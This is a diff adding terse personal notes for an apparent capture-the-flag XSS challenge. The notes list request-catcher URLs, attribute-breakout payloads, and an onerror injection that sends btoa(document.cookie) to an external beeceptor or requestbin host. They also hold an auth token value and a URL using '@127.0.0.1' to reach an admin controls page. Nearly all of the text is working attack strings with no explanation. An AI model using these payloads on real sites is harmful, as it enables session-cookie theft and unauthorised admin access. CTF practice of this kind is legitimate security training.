@@ -1,0 +1,17 @@
+https://webhook.site/791aac23-9052-4591-85d3-a5d6cb60e217
+http://requestbin.fullcontact.com/t9mutkt9
+
+'"><img src="http://requestbin.fullcontact.com/t9mutkt9">
+
+$.get('http://requestbin.fullcontact.com/t9mutkt9?' + btoa(document.cookie))
+
+'"><img src=asdf onerror="$.get('https://testingctf.free.beeceptor.com?'+btoa(document.cookie))"</img>
+
+
+auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
+https://cwo-xss.web.ctfcompetition.com/admin/controls
+
+Go to watch livestream which has full link
+Then play around
+
+https://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls
